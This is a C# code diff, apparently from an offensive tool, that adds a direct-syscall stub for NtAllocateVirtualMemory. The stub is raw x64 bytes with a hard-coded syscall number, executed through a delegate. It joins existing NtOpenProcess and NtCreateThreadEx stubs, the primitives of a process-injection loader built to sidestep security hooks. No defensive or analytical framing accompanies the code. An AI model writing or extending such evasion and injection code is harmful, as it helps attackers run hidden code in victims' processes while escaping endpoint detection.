@@ -3,6 +3,7 @@ using System.Runtime.InteropServices;
 using static System.Net.Mime.MediaTypeNames;
 using System.Security.Cryptography;
 using System.Net.NetworkInformation;
+using static tRWXiu.Utils.Syscalls;
 
 namespace tRWXiu.Utils
 {
@@ -21,6 +22,10 @@ namespace tRWXiu.Utils
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate uint NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionZize, UInt32 AllocationType, UInt32 Protect);
+
         }
 
         public static byte[] bNtOpenProcess =
@@ -129,6 +134,29 @@ namespace tRWXiu.Utils
                     Delegates.NtCreateThreadEx assembledFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer((IntPtr)ptr, typeof(Delegates.NtCreateThreadEx));
 
                     return (uint)assembledFunction(ref threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, inCreateSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList);
+                }
+            }
+        }
+
+        static byte[] bNtAllocateVirtualMemory =
+        {
+            0x4C, 0x8B, 0xD1,               // mov r10, rcx
+            0xB8, 0x18, 0x00, 0x00, 0x00,   // mov eax, 0x18 (NtAllocateVirtualMemory Syscall)
+            0x0F, 0x05,                     // syscall
+            0xC3                            // ret
+        };
+
+        public static uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionZize, UInt32 AllocationType, UInt32 Protect)
+        {
+            unsafe
+            {
+                fixed (byte* ptr = bNtAllocateVirtualMemory)
+                {
+                    allocatePtr((IntPtr)ptr, bNtAllocateVirtualMemory);
+
+                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer((IntPtr)ptr, typeof(Delegates.NtAllocateVirtualMemory));
+
+                    return (uint)assembledFunction(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionZize, AllocationType, Protect);
                 }
             }
         }
